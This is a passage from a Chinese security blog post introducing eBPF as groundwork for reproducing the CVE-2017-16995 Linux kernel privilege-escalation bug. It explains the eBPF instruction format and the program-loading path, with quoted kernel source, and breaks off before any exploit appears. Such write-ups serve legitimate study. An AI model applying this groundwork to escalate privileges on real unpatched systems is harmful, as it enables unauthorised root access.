

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="前言CVE-2017-16995是一个ebpf模块相关的内核提权漏洞，漏洞存在于内核版本小于4.13.9的系统中，漏洞成因为kernel&#x2F;bpf&#x2F;verifier.c文件中的check_alu_op函数的检查问题，这个漏洞可以允许一个普通用户向系统发起拒绝服务攻击(内存破坏)或者提升到特权用户。 前置知识eBPF简介众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编">
<meta property="og:type" content="article">
<meta property="og:title" content="ebpf入门&amp;cve-2017-16995复现">
<meta property="og:url" content="http://example.com/2022/08/10/ebpf%E5%85%A5%E9%97%A8-cve-2017-16995%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="verf1sh&#39;blog">
<meta property="og:description" content="前言CVE-2017-16995是一个ebpf模块相关的内核提权漏洞，漏洞存在于内核版本小于4.13.9的系统中，漏洞成因为kernel&#x2F;bpf&#x2F;verifier.c文件中的check_alu_op函数的检查问题，这个漏洞可以允许一个普通用户向系统发起拒绝服务攻击(内存破坏)或者提升到特权用户。 前置知识eBPF简介众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/09/24/fS2vMsnukzrZ3oj.png">
<meta property="og:image" content="https://s2.loli.net/2022/09/24/C32Rj8wGT6a1MFq.png">
<meta property="og:image" content="https://s2.loli.net/2022/09/24/lRC9qFITD4wjPty.png">
<meta property="article:published_time" content="2022-08-10T13:15:37.000Z">
<meta property="article:modified_time" content="2022-09-24T11:16:40.392Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/09/24/fS2vMsnukzrZ3oj.png">
  
  <title>ebpf入门&amp;cve-2017-16995复现 - verf1sh&#39;blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>verf1sh&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="ebpf入门&amp;cve-2017-16995复现">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-08-10 21:15" pubdate>
        2022年8月10日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      32k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      101 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ebpf入门&amp;cve-2017-16995复现</h1>
            
            <div class="markdown-body">
              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2017-16995是一个ebpf模块相关的内核提权漏洞，漏洞存在于内核版本小于4.13.9的系统中，漏洞成因为kernel/bpf/verifier.c文件中的check_alu_op函数的检查问题，这个漏洞可以允许一个普通用户向系统发起拒绝服务攻击(内存破坏)或者提升到特权用户。</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="eBPF简介"><a href="#eBPF简介" class="headerlink" title="eBPF简介"></a>eBPF简介</h2><p>众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p>
<h2 id="eBPF指令集"><a href="#eBPF指令集" class="headerlink" title="eBPF指令集"></a>eBPF指令集</h2><p>eBPF也有一套自己的指令集，可以想象成实现了一个虚拟机，其中有11个虚拟寄存器，根据调用规则可以对应到我们x86的寄存器中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">R0 -- RAX<br>R1 -- RDI<br>R2 -- RSI<br>R3 -- RDX<br>R4 -- RCX<br>R5 -- R8<br>R6 -- RBX<br>R7 -- R13<br>R8 -- R14<br>R9 -- R15<br>R10 -- RBP<br></code></pre></td></tr></table></figure>
<p>每条指令的格式如下，成员包括操作码，目标寄存器，源寄存器，偏移和立即数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>    __u8    code;       <span class="hljs-comment">/* opcode */</span><br>    __u8    dst_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* dest register */</span><br>    __u8    src_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* source register */</span><br>    __s16   off;        <span class="hljs-comment">/* signed offset */</span><br>    __s32   imm;        <span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
<p>如一条简单的x86赋值指令：mov esi, 0xffffffff,对应的BPF指令为：BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)，其对应的数据结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)					\</span><br><span class="hljs-meta">	((struct bpf_insn) &#123;					\</span><br><span class="hljs-meta">		.code  = BPF_ALU | BPF_MOV | BPF_K,		\</span><br><span class="hljs-meta">		.dst_reg = DST,					\</span><br><span class="hljs-meta">		.src_reg = 0,					\</span><br><span class="hljs-meta">		.off   = 0,					\</span><br><span class="hljs-meta">		.imm   = IMM &#125;)</span><br></code></pre></td></tr></table></figure>
<p>操作码共有8种大类，以低3bit区分不同操作码，BPF_ALU为计算指令，BPF_MISC为其他指令，其他指令根据名字就可以猜到其含义。<br>eBPF指令的编码如下，低三个bits被用来做指令大类的标志。这部分参考了文档，这里可以看到0x6和0x7两个指令名在源码中命名实际上是用BPF，这里只介绍eBPF。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  +----------------+--------+--------------------+<br>  |   <span class="hljs-number">4</span> bits       |  <span class="hljs-number">1</span> bit |   <span class="hljs-number">3</span> bits           |<br>  | operation code | source | instruction <span class="hljs-class"><span class="hljs-keyword">class</span>  |</span><br><span class="hljs-class">  +----------------+--------+--------------------+</span><br><span class="hljs-class">  (<span class="hljs-title">MSB</span>)                                      (<span class="hljs-title">LSB</span>)</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">Three</span> <span class="hljs-title">LSB</span> <span class="hljs-title">bits</span> <span class="hljs-title">store</span> <span class="hljs-title">instruction</span> <span class="hljs-keyword">class</span> <span class="hljs-title">which</span> <span class="hljs-title">is</span> <span class="hljs-title">one</span> <span class="hljs-title">of</span>:</span><br><br>  Classic BPF classes:    eBPF classes:<br><br>  BPF_LD    <span class="hljs-number">0x00</span>          BPF_LD    <span class="hljs-number">0x00</span><br>  BPF_LDX   <span class="hljs-number">0x01</span>          BPF_LDX   <span class="hljs-number">0x01</span><br>  BPF_ST    <span class="hljs-number">0x02</span>          BPF_ST    <span class="hljs-number">0x02</span><br>  BPF_STX   <span class="hljs-number">0x03</span>          BPF_STX   <span class="hljs-number">0x03</span><br>  BPF_ALU   <span class="hljs-number">0x04</span>          BPF_ALU   <span class="hljs-number">0x04</span><br>  BPF_JMP   <span class="hljs-number">0x05</span>          BPF_JMP   <span class="hljs-number">0x05</span><br>  BPF_RET   <span class="hljs-number">0x06</span>          [ <span class="hljs-class"><span class="hljs-keyword">class</span> 6 <span class="hljs-title">unused</span>, <span class="hljs-title">for</span> <span class="hljs-title">future</span> <span class="hljs-title">if</span> <span class="hljs-title">needed</span> ]</span><br><span class="hljs-class">  <span class="hljs-title">BPF_MISC</span>  0<span class="hljs-title">x07</span>          <span class="hljs-title">BPF_ALU64</span> 0<span class="hljs-title">x07</span></span><br></code></pre></td></tr></table></figure>
<p>当指令类型为BPF_ALU or BPF_JMP，第4bit进行编码，BPF_K表示使用32位的立即数作为源操作数，BPF_X表示使用寄存器X作为源操作数。MSB的4bit表示操作数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_K     <span class="hljs-number">0x00</span><br>BPF_X     <span class="hljs-number">0x08</span><br></code></pre></td></tr></table></figure>
<p>当指令类型为BPF_ALU or BPF_ALU64，实际指令类型为以下之一，也就是常见的运算指令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">If <span class="hljs-title">BPF_CLASS</span><span class="hljs-params">(code)</span> </span>== BPF_ALU <span class="hljs-keyword">or</span> BPF_ALU64 [ in eBPF ], BPF_OP(code) is one of:<br><br>  BPF_ADD   <span class="hljs-number">0x00</span><br>  BPF_SUB   <span class="hljs-number">0x10</span><br>  BPF_MUL   <span class="hljs-number">0x20</span><br>  BPF_DIV   <span class="hljs-number">0x30</span><br>  BPF_OR    <span class="hljs-number">0x40</span><br>  BPF_AND   <span class="hljs-number">0x50</span><br>  BPF_LSH   <span class="hljs-number">0x60</span><br>  BPF_RSH   <span class="hljs-number">0x70</span><br>  BPF_NEG   <span class="hljs-number">0x80</span><br>  BPF_MOD   <span class="hljs-number">0x90</span><br>  BPF_XOR   <span class="hljs-number">0xa0</span><br>  BPF_MOV   <span class="hljs-number">0xb0</span>  <span class="hljs-comment">/* eBPF only: mov reg to reg */</span><br>  BPF_ARSH  <span class="hljs-number">0xc0</span>  <span class="hljs-comment">/* eBPF only: sign extending shift right */</span><br>  BPF_END   <span class="hljs-number">0xd0</span>  <span class="hljs-comment">/* eBPF only: endianness conversion */</span><br></code></pre></td></tr></table></figure>
<p>当指令类型为BPF_JMP ，指令实际类型为以下之一，包括条件跳转和非条件跳转。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">If <span class="hljs-title">BPF_CLASS</span><span class="hljs-params">(code)</span> </span>== BPF_JMP, BPF_OP(code) is one of:<br><br>  BPF_JA    <span class="hljs-number">0x00</span><br>  BPF_JEQ   <span class="hljs-number">0x10</span><br>  BPF_JGT   <span class="hljs-number">0x20</span><br>  BPF_JGE   <span class="hljs-number">0x30</span><br>  BPF_JSET  <span class="hljs-number">0x40</span><br>  BPF_JNE   <span class="hljs-number">0x50</span>  <span class="hljs-comment">/* eBPF only: jump != */</span><br>  BPF_JSGT  <span class="hljs-number">0x60</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span><br>  BPF_JSGE  <span class="hljs-number">0x70</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span><br>  BPF_CALL  <span class="hljs-number">0x80</span>  <span class="hljs-comment">/* eBPF only: function call */</span><br>  BPF_EXIT  <span class="hljs-number">0x90</span>  <span class="hljs-comment">/* eBPF only: function return */</span><br></code></pre></td></tr></table></figure>
<p>举个小例子，如 BPF_ADD  |  BPF_X  |  BPF_ALU表示的含义是(u32) dst_reg + (u32) src_reg，BPF_XOR | BPF_K | BPF_ALU表示src_reg = (u32) src_reg ^ (u32) imm32。</p>
<h2 id="eBPF的加载过程"><a href="#eBPF的加载过程" class="headerlink" title="eBPF的加载过程"></a>eBPF的加载过程</h2><p>一个典型的BPF程序流程为：</p>
<ol>
<li>用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</li>
<li>用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</li>
<li>用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。progfd为上一步骤的返回值。</li>
<li>用户程序通过操作上一步骤中的socket来触发BPF真正执行。<h3 id="BPF-MAP-CREATE"><a href="#BPF-MAP-CREATE" class="headerlink" title="BPF_MAP_CREATE"></a>BPF_MAP_CREATE</h3>这个系统调用首先调用map_create函数，其核心思想是对申请出一块内存空间，其大小是管理块结构体+attr参数中的size大小，为其分配fd，并将其放入到map队列中，可以用fd号来查找。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* called via syscall */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">map_create</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span>;</span><br>	<span class="hljs-keyword">int</span> err;<br><br>	err = CHECK_ATTR(BPF_MAP_CREATE);<br>	<span class="hljs-keyword">if</span> (err)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	<span class="hljs-comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span><br>	<span class="hljs-built_in">map</span> = find_and_alloc_map(attr);<br>	<span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>))<br>		<span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br><br>	atomic_set(&amp;<span class="hljs-built_in">map</span>-&gt;refcnt, <span class="hljs-number">1</span>);<br>	atomic_set(&amp;<span class="hljs-built_in">map</span>-&gt;usercnt, <span class="hljs-number">1</span>);<br><br>	err = bpf_map_charge_memlock(<span class="hljs-built_in">map</span>);<br>	<span class="hljs-keyword">if</span> (err)<br>		<span class="hljs-keyword">goto</span> free_map;<br><br>	err = bpf_map_new_fd(<span class="hljs-built_in">map</span>);<br>	<span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-comment">/* failed to allocate fd */</span><br>		<span class="hljs-keyword">goto</span> free_map;<br><br>	<span class="hljs-keyword">return</span> err;<br><br>free_map:<br>	<span class="hljs-built_in">map</span>-&gt;ops-&gt;map_free(<span class="hljs-built_in">map</span>);<br>	<span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure>
<h3 id="BPF-PROG-LOAD"><a href="#BPF-PROG-LOAD" class="headerlink" title="BPF_PROG_LOAD"></a>BPF_PROG_LOAD</h3>这个系统调用用于将用户编写的EBPF规则加载进入内核，其中包含有多处校验.<h4 id="bpf-prog-load"><a href="#bpf-prog-load" class="headerlink" title="bpf_prog_load"></a>bpf_prog_load</h4>首先进入<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c#L621">bpf_prog_load</a>函数中，功能流程如下。<br>[1]检查的ebpf license是否为GPL证书的一种。<br>[2]检查指令条数是否超过4096。<br>[3]处利用kmalloc新建了一个bpf_prog结构体，并新建了一个用于存放EBPF程序的内存空间。<br>[4]处将用户态的EBPF程序拷贝到刚申请的内存中。<br>[5]处来判断是哪种过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最终到达[5]处开始对用户输入的程序进行检查。如果通过检查就将fp中执行函数赋值为 __bpf_prog_run也就是真实执行函数，并尝试JIT加载，否则用中断的方法加载。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">bpf_prog_load</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span> =</span> attr-&gt;prog_type;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> *<span class="hljs-title">prog</span>;</span><br>	<span class="hljs-keyword">int</span> err;<br>	<span class="hljs-keyword">char</span> license[<span class="hljs-number">128</span>];<br>	<span class="hljs-keyword">bool</span> is_gpl;<br><br>	<span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	<span class="hljs-comment">/* copy eBPF program license from user space */</span><br>	<span class="hljs-keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),<br>			      <span class="hljs-keyword">sizeof</span>(license) - <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> -EFAULT;<br>	license[<span class="hljs-keyword">sizeof</span>(license) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span><br>[<span class="hljs-number">1</span>] is_gpl = license_is_gpl_compatible(license);<br><br>[<span class="hljs-number">2</span>]	<span class="hljs-keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS) <span class="hljs-comment">// 4096</span><br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	<span class="hljs-keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;<br>	    attr-&gt;kern_version != LINUX_VERSION_CODE)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	<span class="hljs-keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))<br>		<span class="hljs-keyword">return</span> -EPERM;<br><br>	<span class="hljs-comment">/* plain bpf_prog allocation */</span><br>[<span class="hljs-number">3</span>]	prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);<br>	<span class="hljs-keyword">if</span> (!prog)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	err = bpf_prog_charge_memlock(prog);<br>	<span class="hljs-keyword">if</span> (err)<br>		<span class="hljs-keyword">goto</span> free_prog_nouncharge;<br><br>	prog-&gt;len = attr-&gt;insn_cnt;<br><br>	err = -EFAULT;<br>[<span class="hljs-number">4</span>]	<span class="hljs-keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),<br>			   prog-&gt;len * <span class="hljs-keyword">sizeof</span>(struct bpf_insn)) != <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> free_prog;<br><br>	prog-&gt;orig_prog = <span class="hljs-literal">NULL</span>;<br>	prog-&gt;jited = <span class="hljs-number">0</span>;<br><br>	atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="hljs-number">1</span>);<br>	prog-&gt;gpl_compatible = is_gpl ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">/* find program type: socket_filter vs tracing_filter */</span><br>[<span class="hljs-number">5</span>]	err = find_prog_type(type, prog);<br>	<span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> free_prog;<br><br>	<span class="hljs-comment">/* run eBPF verifier */</span><br>[<span class="hljs-number">6</span>]	err = bpf_check(&amp;prog, attr);<br>	<span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> free_used_maps;<br><br>	<span class="hljs-comment">/* fixup BPF_CALL-&gt;imm field */</span><br>	fixup_bpf_calls(prog);<br><br>	<span class="hljs-comment">/* eBPF program is ready to be JITed */</span><br>	err = bpf_prog_select_runtime(prog);<br>	<span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> free_used_maps;<br><br>	err = bpf_prog_new_fd(prog);<br>	<span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-comment">/* failed to allocate fd */</span><br>		<span class="hljs-keyword">goto</span> free_used_maps;<br><br>	<span class="hljs-keyword">return</span> err;<br><br>free_used_maps:<br>	free_used_maps(prog-&gt;aux);<br>free_prog:<br>	